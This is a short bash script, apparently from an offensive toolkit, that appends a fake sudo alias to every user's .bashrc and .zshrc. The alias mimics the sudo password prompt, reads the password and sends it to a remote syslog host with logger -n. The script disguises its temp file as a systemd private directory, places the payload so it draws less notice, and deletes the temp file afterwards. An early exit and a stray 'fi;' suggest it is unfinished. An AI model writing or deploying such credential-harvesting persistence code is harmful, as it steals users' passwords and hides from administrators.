#!/bin/bash

. env.sh

echo "NOT READY YET"
exit

TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"

cat << EOF > /tmp/$TMPNAME2
  alias sudo='echo -n "[sudo] password for \$USER: ";fi; read -s pwd; echo; /usr/bin/logger -n $SYSLOGHOST sudo password for $USER is $pwd; /usr/bin/sudo -S '
EOF

#Do all of the users
for user in $(ls /home);do
  if [ -f ~/.bashrc ]; then
      #Need to add more at end so that this stuff isn't as prominent.
      cat /tmp/$TMPNAME2 >> ~$user/.bashrc
  fi
  if [ -f ~/.zshrc ]; then
      cat /tmp/$TMPNAME2 >> ~$user/.zshrc
  fi
done

rm /tmp/$TMPNAME2

./logger.sh set up logging of sudo password in $TMPNAME2